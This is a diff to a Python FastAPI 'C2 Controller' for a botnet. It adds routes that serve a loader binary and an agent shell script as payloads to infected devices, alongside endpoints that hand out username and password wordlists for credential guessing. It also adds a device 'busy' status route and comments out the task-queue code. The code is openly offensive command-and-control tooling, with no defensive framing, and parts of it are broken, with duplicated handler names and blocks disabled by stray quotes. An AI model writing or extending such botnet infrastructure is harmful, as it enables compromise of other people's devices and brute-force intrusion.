@@ -24,7 +24,10 @@ from typing import Any
 
 this_path = os.path.dirname(inspect.stack()[0][1])
 app = FastAPI(title="C2 Controller")
-DB = os.getenv("DB_PATH", "botnet.db")
+
+PORT = int(os.getenv("REPORT_PORT", 5000))
+default_db_path = os.path.join(this_path, "../db/botnet.db")
+DB   = os.getenv("DB_PATH", default_db_path)
 
 
 # ─────────────────────────────────────────
@@ -33,11 +36,11 @@ DB = os.getenv("DB_PATH", "botnet.db")
 
 def get_con():
     con = sqlite3.connect(DB, check_same_thread=False)
-    con.row_factory = sqlite3.Row
+    con.row_factory = sqlite3.Row # what the fuck is this for?
     con.execute("PRAGMA journal_mode=WAL")  # safe for multi-process shared DB
     return con
 
-
+'''
 def db_init():
     con = get_con()
     con.executescript("""
@@ -129,11 +132,12 @@ VALID_TASKS = {"PING", "SLEEP"}  # later implement the rest
 
 class AddPayload(BaseModel):
     device_id: str
-    task: str
+    task: str '''
 
 # ─────────────────────────────────────────
 # Routes
 # ─────────────────────────────────────────
+'''
 
 @app.post("/add", status_code=204)
 def add_task(payload: AddPayload):
@@ -201,14 +205,24 @@ def get_tasks(device_id: str):
     con.close()
 
     return [{"task_id": r["id"], "task": r["task"]} for r in rows]
+'''
 
-@app.get("/payload")
+@app.get("/payload/loader")
 def get_payload(device_id: int):
     binary_path = os.path.join(this_path, "../bin/loader_amd64")
     return FileResponse(
             path=binary_path,
             media_type="application/octet-stream",
             filename="loader_amd64"
+            )
+
+@app.get("/payload/agent")
+def get_payload(device_id: int):
+    binary_path = os.path.join(this_path, "../device/agent.sh")
+    return FileResponse(
+            path=binary_path,
+            media_type="application/octet-stream",
+            filename="agent.sh"
             )
 
 @app.get("/wordlist/users")
@@ -228,6 +242,19 @@ def get_payload(device_id: int):
             media_type="application/octet-stream",
             filename="testpass.txt"
             )
+
+@app.post("/busy")
+def post_busy(busystatus: int, device_id: int):
+    if device_id > 1:
+        device_id = 1
+
+    con = get_con()
+    con.execute("""
+        UPDATE devices
+        SET busy = ?
+        WHERE device_id = ?
+    """, [busystatus, device_id])
+    con.commit()
 
 @app.post("/result", status_code=204)
 def post_result(payload: ResultPayload):
